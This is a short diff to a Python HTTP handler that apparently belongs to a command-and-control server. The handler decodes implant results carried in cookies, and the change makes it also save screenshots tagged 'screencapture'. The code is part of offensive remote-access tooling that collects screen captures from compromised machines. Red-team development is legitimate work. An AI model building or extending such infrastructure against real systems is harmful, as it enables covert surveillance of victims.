@@ -192,7 +192,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
               if "ModuleLoaded" in decCookie:
                 print "Module loaded sucessfully"
                 insert_completedtask(RandomURI, decCookie, "Module loaded sucessfully", "")
-              if "get-screenshot" in decCookie.lower():
+              if "get-screenshot" in decCookie.lower() or "screencapture" in decCookie.lower():
                 try:
                   decoded = base64.b64decode(outputParsed) 
                   filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_"+randomuri())
